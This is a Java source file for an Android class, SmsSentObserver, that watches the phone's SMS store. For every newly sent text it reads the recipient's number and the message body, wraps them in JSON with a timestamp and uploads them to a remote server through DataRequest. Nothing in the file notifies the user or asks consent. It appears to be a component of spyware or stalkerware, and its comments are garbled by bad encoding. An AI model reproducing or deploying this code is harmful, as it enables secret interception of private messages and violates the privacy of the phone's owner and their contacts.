package com.inet.android.sms;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.preference.PreferenceManager;

import com.inet.android.bs.RequestMakerImpl;
import com.inet.android.request.DataRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

public class SmsSentObserver extends ContentObserver {

	private static final String TAG = "SMSTSentObserver";
	private static final Uri STATUS_URI = Uri.parse("content://sms");
	String dir = null;
	SharedPreferences sp;
	private Context mContext;
	RequestMakerImpl req;
	private static long id = 0;
	Handler handler;
	
	public SmsSentObserver(Handler handler, Context ctx) {
		super(handler);
		mContext = ctx;
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
	}

	public SmsSentObserver(Handler handler) {
		super(handler);
		// TODO Auto-generated constructor stub
		this.handler = handler;
	}

	public boolean deliverSelfNotifications() {
		return true;
	}

	public void onChange(boolean selfChange) {
		dir = "6";
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);

		try {
			ConvertDate date = new ConvertDate();
			Logging.doLog(TAG, "Notification on SMS observer",
					"Notification on SMS observer");

			Cursor sms_sent_cursor = mContext.getContentResolver().query(
					STATUS_URI, null, null, null, null);
			if (sms_sent_cursor != null) {
				if (sms_sent_cursor.moveToFirst()) {
					String protocol = sms_sent_cursor.getString(sms_sent_cursor
							.getColumnIndex("protocol"));

					Logging.doLog(TAG, "protocol : " + protocol, "protocol : "
							+ protocol);

					if (protocol == null) {
						// String[] colNames = sms_sent_cursor.getColumnNames();
						int type = sms_sent_cursor.getInt(sms_sent_cursor
								.getColumnIndex("type"));

						Logging.doLog(TAG, "SMS Type : " + type, "SMS Type : "
								+ type);

						if (type == 2) {
							long messageId = sms_sent_cursor
									.getLong(sms_sent_cursor
											.getColumnIndex("_id"));
							// ��������� �� ������������ �� �� ��� ���������
							// ������-���
							if (messageId != id) {
								id = messageId;
								int threadId = sms_sent_cursor
										.getInt(sms_sent_cursor
												.getColumnIndex("thread_id"));
								Cursor c = mContext.getContentResolver().query(
										Uri.parse("content://sms/outbox/"
												+ threadId), null, null, null,
										null);
								c.moveToNext();
								String phNumber = sms_sent_cursor
										.getString(sms_sent_cursor
												.getColumnIndex("address"));
								String message = sms_sent_cursor
										.getString(sms_sent_cursor
												.getColumnIndex("body"));
								// -------send sms----------------------------
								String sendJSONStr = null;
								JSONObject jsonObject = new JSONObject();
								JSONArray data = new JSONArray();
								JSONObject info = new JSONObject();
								JSONObject object = new JSONObject();
								try {

									info.put("number", phNumber);
									info.put("data", message);

									object.put("time", date.logTime());
									object.put("type", dir);
									object.put("info", info);
									data.put(object);
									jsonObject.put("data", data);
									sendJSONStr = object.toString();
								} catch (JSONException e) {
									Logging.doLog(TAG, "json ��������",
											"json ��������");
								}

								DataRequest dr = new DataRequest(mContext);
								dr.sendRequest(sendJSONStr);

								Logging.doLog(TAG, sendJSONStr, sendJSONStr);

								/*
								 * if(colNames != null){ for(int k=0;
								 * k<colNames.length; k++){ Log.e(TAG,
								 * "colNames["+k+"] : " + colNames[k]); } }
								 */
								sms_sent_cursor.close();
							}
						}
					}
				}
			} else

				Logging.doLog(TAG, "smsSentObserver: Send Cursor is Empty",
						"smsSentObserver: Send Cursor is Empty");
		} catch (Exception sggh) {
			Logging.doLog(TAG, "Error on onChange : " + sggh.toString(),
					"Error on onChange : " + sggh.toString());
		}
		super.onChange(selfChange);
	}

}// End of class SmsSentObserver
